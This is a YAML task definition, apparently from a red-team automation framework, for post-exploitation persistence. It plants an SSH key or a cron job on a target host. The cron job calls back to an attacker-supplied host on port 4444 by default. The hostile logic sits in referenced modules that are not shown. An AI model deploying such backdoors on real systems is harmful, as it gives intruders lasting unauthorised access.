name: persistence
description: Persistence mechanisms — establish persistent access via scheduled tasks,
  services, SSH keys, and WMI subscriptions.
tags:
- post
- persistence
- backdoor
- scheduled-task
- ssh
dispatch:
  inputs:
    target:
      required: true
      type: string
      description: Target host
      alias: t
    username:
      required: true
      type: string
      description: Admin username
    password:
      type: string
      default: ''
      description: Password
    lhost:
      required: true
      type: string
      description: Callback host/IP for reverse connections
    lport:
      type: number
      default: 4444
      description: Callback port
    method:
      type: string
      default: ssh-key
      description: 'Method: ssh-key, scheduled-task, wmi, cron'
    log_command:
      type: string
      default: 'true'
      description: Enable command logging
jobs:
  ssh-persistence:
    name: SSH Key Persistence
    run_if: '{{ inputs.method == ''ssh-key'' }}'
    steps:
    - name: add-ssh-key
      module: local.add_ssh_key
      with:
        username: "{{ inputs.username }}"
        target: "{{ inputs.target }}"
  cron-persistence:
    name: Cron Job Persistence
    run_if: '{{ inputs.method == ''cron'' }}'
    steps:
    - name: add-cron
      module: local.add_cron
      with:
        lhost: "{{ inputs.lhost }}"
        lport: "{{ inputs.lport }}"